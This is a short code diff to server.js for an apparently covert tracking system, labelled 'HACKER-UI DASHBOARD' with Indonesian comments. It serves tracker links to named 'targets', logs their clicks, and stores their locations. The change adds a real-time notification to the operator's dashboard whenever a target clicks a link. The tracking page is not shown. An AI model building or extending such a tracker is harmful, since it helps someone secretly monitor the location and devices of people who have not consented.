@@ -1,4 +1,4 @@
-// File: server.js (FINAL MERGE v3.0 - Full Features + Detailed Live Log + Device Info)
+// File: server.js (FINAL MERGE v3.1 - Notifikasi Klik Real-time)
 
 require('dotenv').config();
 
@@ -163,6 +163,9 @@ app.get('/:id', async (req, res) => {
         );
 
         broadcastLogMessage(`> Link [${id}] clicked by target [${username}]`);
+        
+        // !!! PENAMBAHAN BARU: Kirim notifikasi khusus ke dashboard !!!
+        io.emit('link_clicked', { username: username, id: id });
 
         // Kirim tracker.html
         fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
@@ -272,7 +275,7 @@ app.get('/api/locations/:trackerId', async (req, res) => {
 // ================== RUN SERVER ================== //
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v3.0 (Full Features + Detailed Live Log + Device Info)`);
-    console.log(`===================================================`);
+    console.log(`\n HACKER-UI DASHBOARD v3.1 (Full Features + Detailed Live Log + Device Info + Click Notification)`);
+    console.log(`=============================================================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
